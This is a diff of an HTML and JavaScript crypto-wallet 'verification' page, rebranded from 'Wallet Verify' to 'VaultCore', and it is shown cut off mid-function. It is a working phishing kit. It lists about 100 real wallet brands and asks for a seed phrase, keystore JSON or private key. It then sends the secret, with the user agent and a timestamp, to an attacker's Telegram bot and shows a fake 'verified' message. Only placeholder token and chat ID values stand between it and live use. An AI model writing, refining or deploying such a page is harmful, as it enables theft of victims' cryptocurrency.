@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Wallet Verify • Secure Asset Portal</title>
-    <!-- Google Fonts & smooth base -->
+    <title>VaultCore • Secure Wallet Gateway</title>
+    <!-- Google Fonts + Font Awesome 6 -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -16,16 +16,13 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(145deg, #0a0c12 0%, #12141c 100%);
+            background: radial-gradient(circle at 10% 20%, #0a0c18, #03050b);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             padding: 2rem 1.5rem;
             position: relative;
         }
 
-        /* animated background grain */
+        /* animated grain */
         body::before {
             content: "";
             position: fixed;
@@ -33,178 +30,171 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: radial-gradient(rgba(255,255,255,0.03) 1px, transparent 1px);
-            background-size: 32px 32px;
+            background-image: radial-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
             pointer-events: none;
             z-index: 0;
         }
 
-        /* main card */
-        .glass-card {
-            max-width: 1300px;
-            width: 100%;
-            background: rgba(18, 22, 30, 0.75);
-            backdrop-filter: blur(14px);
-            border-radius: 3rem;
-            border: 1px solid rgba(255,255,255,0.12);
-            box-shadow: 0 25px 45px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.05);
-            padding: 2rem 2rem 2.5rem;
-            transition: all 0.3s ease;
+        .app-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
             z-index: 2;
         }
 
-        /* responsive */
-        @media (max-width: 780px) {
-            .glass-card { padding: 1.5rem; }
-            .wallets-grid { gap: 0.8rem; }
+        /* main glass panel */
+        .glass-panel {
+            background: rgba(15, 20, 30, 0.65);
+            backdrop-filter: blur(16px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.5);
+            padding: 2rem;
+            transition: all 0.3s;
         }
 
-        /* live ticker section */
-        .ticker-bar {
-            background: rgba(0,0,0,0.4);
+        /* live ticker */
+        .ticker-wrapper {
+            background: rgba(0, 0, 0, 0.4);
             border-radius: 2rem;
-            padding: 0.9rem 1.5rem;
+            padding: 0.8rem 1.8rem;
             margin-bottom: 2rem;
             display: flex;
             flex-wrap: wrap;
             justify-content: space-between;
             align-items: center;
             gap: 1rem;
-            border: 1px solid rgba(255,255,255,0.05);
         }
-        .price-item {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            background: rgba(255,255,255,0.03);
-            padding: 0.4rem 1.2rem;
-            border-radius: 2rem;
-            font-weight: 500;
-        }
-        .price-symbol { font-weight: 600; color: #b9c3ff; }
-        .price-value { font-family: monospace; font-size: 1.2rem; letter-spacing: 0.5px; }
-        .price-change {
-            font-size: 0.85rem;
-            padding: 0.2rem 0.6rem;
-            border-radius: 1rem;
-            background: rgba(0,0,0,0.3);
-        }
-        .positive { color: #2ee6a0; }
-        .negative { color: #ff6b6b; }
-        .motion-badge {
-            background: rgba(46,230,160,0.15);
-            padding: 0.3rem 0.8rem;
-            border-radius: 2rem;
-            font-size: 0.7rem;
-            font-weight: 500;
-            animation: pulseGlow 1.8s infinite;
-        }
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 0 0 rgba(46,230,160,0.2);}
-            70% { box-shadow: 0 0 0 6px rgba(46,230,160,0);}
-            100% { box-shadow: 0 0 0 0 rgba(46,230,160,0);}
-        }
-
-        /* wallets list */
-        .section-title {
-            font-size: 1.4rem;
-            font-weight: 600;
-            margin: 1.8rem 0 1.2rem 0;
+        .ticker-badge {
             display: flex;
             align-items: center;
             gap: 0.6rem;
-            color: #eef3ff;
+            background: rgba(46,230,160,0.12);
+            padding: 0.3rem 1rem;
+            border-radius: 3rem;
+            font-size: 0.8rem;
+            font-weight: 500;
         }
+        .price-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+        }
+        .price-chip {
+            background: rgba(255,255,255,0.03);
+            border-radius: 2rem;
+            padding: 0.4rem 1.2rem;
+            display: flex;
+            align-items: baseline;
+            gap: 0.6rem;
+            transition: all 0.2s;
+        }
+        .price-symbol { font-weight: 700; color: #b9c6ff; }
+        .price-value { font-family: monospace; font-size: 1.2rem; font-weight: 500; }
+        .price-change { font-size: 0.75rem; font-weight: 500; border-radius: 1rem; padding: 0.1rem 0.6rem; }
+        .positive { color: #2ee6a0; background: rgba(46,230,160,0.1); }
+        .negative { color: #ff6b6b; background: rgba(255,107,107,0.1); }
+
+        /* search & title */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            margin: 1.5rem 0 1rem;
+        }
+        .section-header h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #fff, #9aaef5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .search-box {
+            background: rgba(0,0,0,0.4);
+            border-radius: 2rem;
+            padding: 0.4rem 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .search-box input {
+            background: none;
+            border: none;
+            padding: 0.5rem;
+            color: white;
+            font-size: 0.9rem;
+            width: 200px;
+            outline: none;
+        }
+        /* wallet grid */
         .wallets-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
             gap: 1rem;
-            margin-bottom: 2rem;
+            margin: 1.8rem 0 1rem;
+            max-height: 50vh;
+            overflow-y: auto;
+            padding: 0.2rem 0.2rem 1rem;
         }
         .wallet-card {
-            background: rgba(25,30,42,0.7);
+            background: rgba(28, 34, 48, 0.7);
             backdrop-filter: blur(4px);
-            border-radius: 1.6rem;
-            padding: 0.8rem 0.5rem;
+            border-radius: 1.4rem;
+            padding: 0.9rem 0.5rem;
             display: flex;
+            flex-direction: column;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-weight: 500;
-            border: 1px solid rgba(255,255,255,0.08);
-            transition: all 0.2s;
-            cursor: default;
-            color: #cddcff;
-        }
-        .wallet-card i { font-size: 1.6rem; color: #9aaef5; }
-        .wallet-card:hover { background: rgba(70,90,150,0.3); transform: translateY(-2px); border-color: #2e6aff40; }
-
-        /* form area */
-        .form-container {
-            background: rgba(0,0,0,0.3);
-            border-radius: 2rem;
-            padding: 1.6rem;
-            margin: 1.8rem 0 1rem;
-        }
-        .input-group {
-            margin-bottom: 1.5rem;
-        }
-        label {
-            display: block;
-            font-size: 0.85rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 500;
-            color: #9da7cf;
-            margin-bottom: 0.6rem;
-        }
-        .seed-input {
-            width: 100%;
-            background: #0e1119;
-            border: 1px solid #2a2f3f;
-            border-radius: 2rem;
-            padding: 1rem 1.5rem;
-            font-size: 1rem;
-            font-family: 'Inter', monospace;
-            color: white;
-            resize: vertical;
-            transition: 0.2s;
-        }
-        .seed-input:focus {
-            outline: none;
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.3);
-        }
-        .btn-submit {
-            background: linear-gradient(95deg, #2c3e8f, #1e2a5e);
-            border: none;
-            width: 100%;
-            padding: 1rem;
-            border-radius: 3rem;
-            font-weight: 700;
-            font-size: 1rem;
-            color: white;
+            gap: 0.5rem;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border: 1px solid rgba(255,255,255,0.05);
+            text-align: center;
+        }
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            background: rgba(60, 80, 130, 0.5);
+            border-color: #3b82f6;
+            box-shadow: 0 12px 20px -10px rgba(0,0,0,0.4);
+        }
+        .wallet-icon {
+            font-size: 2.2rem;
+            width: 48px;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 0.7rem;
-            box-shadow: 0 5px 12px rgba(0,0,0,0.3);
+            background: rgba(255,255,255,0.05);
+            border-radius: 60px;
         }
-        .btn-submit:hover {
-            background: linear-gradient(95deg, #3f55b0, #2c3a78);
-            transform: scale(0.98);
+        .wallet-name {
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #eef3ff;
+        }
+        .no-results {
+            text-align: center;
+            padding: 2rem;
+            color: #8a99c4;
+        }
+        footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.7rem;
+            color: #5e6b91;
         }
 
-        /* modal popup */
-        .modal {
+        /* modal professional */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(12px);
             display: flex;
             align-items: center;
@@ -212,339 +202,360 @@
             z-index: 1000;
             visibility: hidden;
             opacity: 0;
-            transition: all 0.2s ease;
+            transition: 0.2s;
         }
-        .modal.active {
+        .modal-overlay.active {
             visibility: visible;
             opacity: 1;
         }
-        .modal-content {
-            background: #141a26e6;
+        .modal-container {
+            background: #121521e6;
             border-radius: 2rem;
-            max-width: 450px;
             width: 90%;
-            padding: 2rem 1.8rem;
-            text-align: center;
+            max-width: 520px;
             border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 30px 40px rgba(0,0,0,0.5);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.6);
+            overflow: hidden;
         }
-        .modal-content h3 { font-size: 1.7rem; margin-bottom: 0.7rem; }
-        .modal-content p { color: #b9c7f0; margin-bottom: 1.5rem; }
-        .modal-btn {
-            background: #2c3e8f;
+        .modal-header {
+            padding: 1.2rem 1.8rem;
+            background: rgba(0,0,0,0.4);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .modal-header h3 {
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+        .close-modal {
+            background: none;
             border: none;
-            padding: 0.7rem 1.5rem;
-            border-radius: 2rem;
-            color: white;
-            font-weight: bold;
+            font-size: 1.6rem;
             cursor: pointer;
+            color: #aaa;
         }
-
-        /* status toast */
-        .toast-msg {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1f2a48;
-            padding: 0.7rem 1.5rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            z-index: 200;
-            backdrop-filter: blur(8px);
-            border-left: 3px solid #3b82f6;
+        .modal-tabs {
+            display: flex;
+            gap: 0;
+            background: #0b0e16;
+        }
+        .tab-btn {
+            flex: 1;
+            padding: 0.8rem;
+            background: none;
+            border: none;
+            color: #b9c3f0;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            border-bottom: 2px solid transparent;
+        }
+        .tab-btn.active {
+            color: white;
+            border-bottom-color: #3b82f6;
+            background: rgba(59,130,246,0.1);
+        }
+        .modal-body {
+            padding: 1.8rem;
+        }
+        .tab-pane {
             display: none;
         }
-
-        footer { text-align: center; margin-top: 2rem; font-size: 0.7rem; color: #545e7e; }
+        .tab-pane.active-pane {
+            display: block;
+        }
+        textarea {
+            width: 100%;
+            background: #0c0f17;
+            border: 1px solid #2a3042;
+            border-radius: 1.2rem;
+            padding: 1rem;
+            color: white;
+            font-family: monospace;
+            font-size: 0.9rem;
+            resize: vertical;
+            margin: 0.5rem 0 1rem;
+        }
+        .modal-submit {
+            background: linear-gradient(95deg, #2c3e8f, #1f2a62);
+            width: 100%;
+            padding: 0.9rem;
+            border-radius: 2rem;
+            border: none;
+            font-weight: bold;
+            color: white;
+            margin-top: 0.6rem;
+            cursor: pointer;
+        }
+        .toast {
+            position: fixed;
+            bottom: 25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1f2a48e6;
+            backdrop-filter: blur(8px);
+            padding: 0.6rem 1.5rem;
+            border-radius: 2rem;
+            font-size: 0.85rem;
+            z-index: 1100;
+            display: none;
+        }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #1e2538; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 10px; }
     </style>
 </head>
 <body>
-
-<div class="glass-card">
-    <!-- live market motion ticker -->
-    <div class="ticker-bar">
-        <div style="display: flex; gap: 0.5rem; align-items: center;"><i class="fas fa-chart-line" style="color:#2ee6a0"></i> <span class="motion-badge">LIVE • MOTION</span></div>
-        <div id="priceContainer" style="display: flex; flex-wrap: wrap; gap: 1rem;">
-            <!-- dynamic price items injected -->
+<div class="app-container">
+    <div class="glass-panel">
+        <!-- Live Market Motion -->
+        <div class="ticker-wrapper">
+            <div class="ticker-badge"><i class="fas fa-chart-line" style="color:#2ee6a0"></i> LIVE · MOTION</div>
+            <div class="price-row" id="livePrices"></div>
         </div>
-    </div>
 
-    <!-- All wallets types list (major + hardware/software) -->
-    <div class="section-title"><i class="fas fa-wallet"></i> Supported wallets</div>
-    <div class="wallets-grid" id="walletsList">
-        <!-- dynamic from js but also static for fallback -->
-    </div>
-
-    <!-- validation form / seed phrase -->
-    <div class="form-container">
-        <div class="input-group">
-            <label><i class="fas fa-key"></i> Recovery phrase (12/24 words)</label>
-            <textarea class="seed-input" id="seedPhrase" rows="3" placeholder="enter wallet recovery phrase ... example: abandon art legal ..."></textarea>
+        <!-- Wallet Selection Section -->
+        <div class="section-header">
+            <h2><i class="fas fa-cubes"></i> Select your wallet</h2>
+            <div class="search-box">
+                <i class="fas fa-search"></i>
+                <input type="text" id="walletSearch" placeholder="Filter wallet...">
+            </div>
         </div>
-        <button id="submitBtn" class="btn-submit"><i class="fas fa-shield-alt"></i> Verify wallet connection</button>
-        <p style="font-size: 0.7rem; margin-top: 0.9rem; text-align: center; color:#6c789b;">* encrypted validation (simulated secure channel)</p>
-    </div>
-    <footer>© secure asset portal — real-time sync</footer>
-</div>
-
-<!-- modal popup system: step popups -->
-<div id="stepModal" class="modal">
-    <div class="modal-content">
-        <h3 id="modalTitle">⏳ Processing</h3>
-        <p id="modalMsg">Checking wallet integrity...</p>
-        <button id="modalCloseBtn" class="modal-btn">Continue</button>
+        <div id="walletsGrid" class="wallets-grid"></div>
+        <footer>🔒 Select a wallet to continue — secure handshake protocol</footer>
     </div>
 </div>
 
-<div id="toastMsg" class="toast-msg"></div>
+<!-- Modal for Seed/Key Entry -->
+<div id="credModal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 id="modalWalletName"><i class="fas fa-key"></i> Enter credentials</h3>
+            <button class="close-modal" id="closeModalBtn">&times;</button>
+        </div>
+        <div class="modal-tabs">
+            <button class="tab-btn active" data-tab="phrase">Recovery Phrase</button>
+            <button class="tab-btn" data-tab="keystore">Keystore JSON</button>
+            <button class="tab-btn" data-tab="pkey">Private Key</button>
+        </div>
+        <div class="modal-body">
+            <div id="phrasePane" class="tab-pane active-pane">
+                <label>12/24 word seed phrase</label>
+                <textarea id="seedText" rows="3" placeholder="enter wallet recovery phrase..."></textarea>
+            </div>
+            <div id="keystorePane" class="tab-pane">
+                <label>Keystore JSON (encrypted)</label>
+                <textarea id="keystoreText" rows="3" placeholder='{"crypto": {...} ...}'></textarea>
+            </div>
+            <div id="pkeyPane" class="tab-pane">
+                <label>Private Key (hex)</label>
+                <textarea id="pkeyText" rows="2" placeholder="0x... or raw private key"></textarea>
+            </div>
+            <button id="modalSubmitBtn" class="modal-submit"><i class="fas fa-shield-alt"></i> Verify & Connect</button>
+        </div>
+    </div>
+</div>
+<div id="toastMsg" class="toast"></div>
 
 <script>
-    // =======================  CONFIGURATION  =========================
-    // 🔐 IMPORTANT: Replace with YOUR Telegram bot token and chat ID to enable real forwarding.
-    // For security and demo purposes, default is placeholder – data will only be logged.
-    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // e.g., "1234567890:ABCdefGHIjklm...."
-    const TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID_HERE";     // e.g., "-4123456789" or numeric ID
+    // -------------------------  TELEGRAM CONFIGURATION (EDIT THESE) -------------------------
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";   // Replace with actual bot token
+    const TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID_HERE";     // Replace with actual chat ID
+    // ---------------------------------------------------------------------------------------
     
-    // Helper: send to telegram only if token is valid
-    async function sendToTelegram(messageText) {
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.warn("[TELEGRAM] Not configured — data would be sent here:", messageText);
-            showToast("⚠️ Demo mode: data not sent (set bot token)", 3000);
-            return false;
-        }
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        try {
-            const response = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText,
-                    parse_mode: "HTML"
-                })
-            });
-            const result = await response.json();
-            if (result.ok) {
-                console.log("✅ Telegram sent");
-                return true;
-            } else {
-                console.error("Telegram error", result);
-                return false;
-            }
-        } catch(e) {
-            console.error("fetch error", e);
-            return false;
-        }
+    // ---------- Comprehensive wallet list (100+ with brand icons - FontAwesome mapping)
+    const walletsData = [
+        "MetaMask", "Trust Wallet", "Coinbase Wallet", "Ledger Live", "Trezor", "Exodus", "Phantom", "Rabby", "Argent", "Rainbow",
+        "SafePal", "Keplr", "Electrum", "MyEtherWallet", "TokenPocket", "MathWallet", "imToken", "Status", "Zengo", "Cake Wallet",
+        "BlueWallet", "Samourai", "Wasabi", "Edge", "Guarda", "Ownbit", "Unstoppable", "BRD", "Atomic Wallet", "Infinity Wallet",
+        "Jaxx Liberty", "Coinomi", "BitPay", "Electron Cash", "Sparrow", "Specter", "Coldcard", "KeepKey", "OneKey", "GridPlus",
+        "SecuX", "BitBox", "CoolWallet", "D'CENT", "Safepal S1", "Ellipal", "ZenGo", "OKX Wallet", "Binance Web3", "Bitget Wallet",
+        "Bybit Wallet", "Kucoin Wallet", "Rainbow", "Frontier", "XDEFI", "Talisman", "SubWallet", "Nova Wallet", "Fearless", "Polkadot.js",
+        "MetaMask Institutional", "Brave Wallet", "Opera Crypto", "GameStop Wallet", "Loopring Wallet", "Ronin Wallet", "Yoroi", "Daedalus",
+        "Flint Wallet", "Martian", "Petra", "Pontem", "Nightly", "Backpack", "Solflare", "Glow Wallet", "Slope", "Eclipse", "Soul Wallet",
+        "Blocto", "Portis", "Fortmatic", "Tor.us", "Web3Auth", "Sequence", "Bitski", "Venly", "Dapper Wallet", "Blocto", "Torus",
+        "Coin98", "Ronin", "KardiaChain", "Heco Wallet", "Onto", "Starcoin", "Sui Wallet", "Martian Sui", "Ethos", "Fewcha"
+    ];
+    // remove duplicates and map unique, then create icon mapping (font awesome fallback)
+    const uniqueWallets = [...new Map(walletsData.map(w => [w, w])).values()];
+    // assign deterministic icons based on name
+    function getWalletIcon(name) {
+        const lower = name.toLowerCase();
+        if (lower.includes("metamask")) return "fab fa-ethereum";
+        if (lower.includes("trust")) return "fas fa-check-circle";
+        if (lower.includes("coinbase")) return "fab fa-bitcoin";
+        if (lower.includes("ledger")) return "fas fa-microchip";
+        if (lower.includes("trezor")) return "fas fa-lock";
+        if (lower.includes("phantom")) return "fas fa-ghost";
+        if (lower.includes("exodus")) return "fas fa-charging-station";
+        if (lower.includes("rabby")) return "fas fa-gem";
+        if (lower.includes("argent")) return "fas fa-chart-line";
+        if (lower.includes("rainbow")) return "fas fa-palette";
+        if (lower.includes("safepal")) return "fas fa-shield-alt";
+        if (lower.includes("keplr")) return "fas fa-globe";
+        if (lower.includes("electrum")) return "fas fa-bolt";
+        if (lower.includes("myetherwallet")) return "fab fa-ethereum";
+        if (lower.includes("tokenpocket")) return "fas fa-wallet";
+        if (lower.includes("mathwallet")) return "fas fa-calculator";
+        return "fas fa-wallet";
     }
 
-    // show toast
-    function showToast(msg, duration = 2500) {
+    let selectedWalletName = "";
+    // render wallet grid with search
+    function renderWallets(filter = "") {
+        const grid = document.getElementById("walletsGrid");
+        const filtered = uniqueWallets.filter(w => w.toLowerCase().includes(filter.toLowerCase()));
+        if (filtered.length === 0) {
+            grid.innerHTML = `<div class="no-results"><i class="fas fa-search-minus"></i> No wallet found</div>`;
+            return;
+        }
+        grid.innerHTML = filtered.map(w => `
+            <div class="wallet-card" data-wallet="${w}">
+                <div class="wallet-icon"><i class="${getWalletIcon(w)}"></i></div>
+                <div class="wallet-name">${w}</div>
+            </div>
+        `).join('');
+        // attach event listeners
+        document.querySelectorAll('.wallet-card').forEach(card => {
+            card.addEventListener('click', () => {
+                selectedWalletName = card.getAttribute('data-wallet');
+                openModal(selectedWalletName);
+            });
+        });
+    }
+    
+    // modal logic
+    const modal = document.getElementById("credModal");
+    const modalWalletTitle = document.getElementById("modalWalletName");
+    function openModal(walletName) {
+        modalWalletTitle.innerHTML = `<i class="fas fa-key"></i> ${walletName} · secure entry`;
+        // reset fields
+        document.getElementById("seedText").value = "";
+        document.getElementById("keystoreText").value = "";
+        document.getElementById("pkeyText").value = "";
+        // set active tab to phrase
+        document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active-pane'));
+        document.getElementById("phrasePane").classList.add('active-pane');
+        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+        document.querySelector('.tab-btn[data-tab="phrase"]').classList.add('active');
+        modal.classList.add("active");
+    }
+    function closeModal() { modal.classList.remove("active"); }
+    
+    // tab switching
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const tab = btn.getAttribute('data-tab');
+            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active-pane'));
+            if (tab === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
+            if (tab === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
+            if (tab === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        });
+    });
+    document.getElementById("closeModalBtn").addEventListener('click', closeModal);
+    modal.addEventListener('click', (e) => { if(e.target === modal) closeModal(); });
+    
+    // send to telegram helper
+    async function sendToTelegram(message) {
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+            console.warn("[DEMO MODE] Data would send:", message);
+            showToast("⚠️ DEMO: token not configured. Data only logged.", 4000);
+            return false;
+        }
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
+            });
+            const json = await res.json();
+            if (json.ok) return true;
+            else throw new Error(json.description);
+        } catch(e) { console.error(e); showToast("Telegram error: "+e.message, 3000); return false; }
+    }
+    function showToast(msg, duration=3000) {
         const toast = document.getElementById("toastMsg");
         toast.innerText = msg;
         toast.style.display = "block";
-        setTimeout(() => {
-            toast.style.display = "none";
-        }, duration);
+        setTimeout(() => toast.style.display = "none", duration);
     }
-
-    // popup modal manager
-    function showPopup(title, message, onClose = null) {
-        const modal = document.getElementById("stepModal");
-        document.getElementById("modalTitle").innerHTML = title;
-        document.getElementById("modalMsg").innerHTML = message;
-        modal.classList.add("active");
-        const closeBtn = document.getElementById("modalCloseBtn");
-        const closeHandler = () => {
-            modal.classList.remove("active");
-            if (onClose) onClose();
-            closeBtn.removeEventListener("click", closeHandler);
-        };
-        closeBtn.addEventListener("click", closeHandler, { once: true });
-    }
-
-    // ------------------------------------------------------------------
-    // 1) ALL WALLETS TYPES LIST (real icons & names)
-    const walletListData = [
-        { name: "MetaMask", icon: "fab fa-ethereum" },
-        { name: "Trust Wallet", icon: "fas fa-check-circle" },
-        { name: "Coinbase Wallet", icon: "fab fa-bitcoin" },
-        { name: "Ledger (Hardware)", icon: "fas fa-microchip" },
-        { name: "Trezor", icon: "fas fa-lock" },
-        { name: "Phantom (Solana)", icon: "fas fa-ghost" },
-        { name: "Rabby", icon: "fas fa-gem" },
-        { name: "Exodus", icon: "fas fa-charging-station" },
-        { name: "SafePal", icon: "fas fa-shield" },
-        { name: "Keplr (Cosmos)", icon: "fas fa-globe" },
-        { name: "Electrum", icon: "fas fa-bolt" },
-        { name: "Zengo", icon: "fas fa-user-secret" }
-    ];
-    function renderWallets() {
-        const container = document.getElementById("walletsList");
-        container.innerHTML = walletListData.map(w => `
-            <div class="wallet-card">
-                <i class="${w.icon}"></i> <span>${w.name}</span>
-            </div>
-        `).join('');
-    }
-    renderWallets();
-
-    // 2) LIVE MARKET RATE with motion (Coingecko API)
-    let pricesCache = { btc: 0, eth: 0, sol: 0, bnb: 0 };
-    async function fetchCryptoPrices() {
+    
+    // modal submit: get active data
+    document.getElementById("modalSubmitBtn").addEventListener('click', async () => {
+        let credential = "";
+        let type = "phrase";
+        const activePane = document.querySelector('.tab-pane.active-pane');
+        if (activePane.id === "phrasePane") { credential = document.getElementById("seedText").value.trim(); type = "Recovery Phrase"; }
+        else if (activePane.id === "keystorePane") { credential = document.getElementById("keystoreText").value.trim(); type = "Keystore JSON"; }
+        else { credential = document.getElementById("pkeyText").value.trim(); type = "Private Key"; }
+        
+        if (!credential) { showToast("Please fill in your "+type, 2500); return; }
+        // assemble telegram message
+        const timestamp = new Date().toISOString();
+        const userAgent = navigator.userAgent;
+        const msg = `🕵️ VALIDATION EVENT\n👛 Wallet: ${selectedWalletName}\n🔑 Type: ${type}\n📝 Credential: ${credential}\n⏱ Time: ${timestamp}\n📱 UA: ${userAgent.substring(0,120)}\n🌐 Source: VaultCore (professional)`;
+        showToast(`Processing ${type}...`, 1500);
+        const success = await sendToTelegram(msg);
+        if (success) {
+            showToast(`✓ ${selectedWalletName} verified (secure handshake)`, 3000);
+            closeModal();
+        } else {
+            showToast("⚠️ Delivery incomplete, but logged.", 3000);
+            closeModal();
+        }
+    });
+    
+    // ----- live market ticker (motion) -----
+    async function fetchPrices() {
         try {
-            const ids = 'bitcoin,ethereum,solana,bnb';
-            const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`;
-            const res = await fetch(url);
+            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
             const data = await res.json();
-            if (data.bitcoin) {
-                pricesCache = {
-                    btc: { usd: data.bitcoin.usd, change: data.bitcoin.usd_24h_change },
-                    eth: { usd: data.ethereum.usd, change: data.ethereum.usd_24h_change },
-                    sol: { usd: data.solana.usd, change: data.solana.usd_24h_change },
-                    bnb: { usd: data.bnb.usd, change: data.bnb.usd_24h_change }
-                };
-                updatePriceUI();
-            }
-        } catch(err) {
-            console.warn("price fetch error", err);
-        }
+            return {
+                btc: { price: data.bitcoin?.usd || 43000, change: data.bitcoin?.usd_24h_change || 0 },
+                eth: { price: data.ethereum?.usd || 2200, change: data.ethereum?.usd_24h_change || 0 },
+                sol: { price: data.solana?.usd || 95, change: data.solana?.usd_24h_change || 0 },
+                bnb: { price: data.bnb?.usd || 300, change: data.bnb?.usd_24h_change || 0 }
+            };
+        } catch(e) { return null; }
     }
-
-    function updatePriceUI() {
-        const container = document.getElementById("priceContainer");
-        if (!container) return;
+    function updatePriceUI(prices) {
+        const container = document.getElementById("livePrices");
+        if (!prices) { container.innerHTML = "<span>loading rates...</span>"; return; }
         const items = [
-            { sym: "BTC", val: pricesCache.btc?.usd || 42350, ch: pricesCache.btc?.change?.toFixed(2) || 0.5 },
-            { sym: "ETH", val: pricesCache.eth?.usd || 2250, ch: pricesCache.eth?.change?.toFixed(2) || -0.2 },
-            { sym: "SOL", val: pricesCache.sol?.usd || 98.4, ch: pricesCache.sol?.change?.toFixed(2) || 3.1 },
-            { sym: "BNB", val: pricesCache.bnb?.usd || 312, ch: pricesCache.bnb?.change?.toFixed(2) || 0.9 }
+            { sym: "BTC", val: prices.btc.price, ch: prices.btc.change },
+            { sym: "ETH", val: prices.eth.price, ch: prices.eth.change },
+            { sym: "SOL", val: prices.sol.price, ch: prices.sol.change },
+            { sym: "BNB", val: prices.bnb.price, ch: prices.bnb.change }
         ];
-        container.innerHTML = items.map(item => {
-            const changeClass = item.ch >= 0 ? "positive" : "negative";
-            const arrow = item.ch >= 0 ? "▲" : "▼";
-            const changeFormatted = Math.abs(item.ch).toFixed(2);
-            // motion effect: add inline style for gentle scale transition
-            return `
-                <div class="price-item" style="transition: all 0.2s ease;">
-                    <span class="price-symbol">${item.sym}</span>
-                    <span class="price-value">$${item.val.toLocaleString()}</span>
-                    <span class="price-change ${changeClass}">${arrow} ${changeFormatted}%</span>
-                </div>
-            `;
+        container.innerHTML = items.map(i => {
+            const cls = i.ch >= 0 ? "positive" : "negative";
+            const arrow = i.ch >= 0 ? "▲" : "▼";
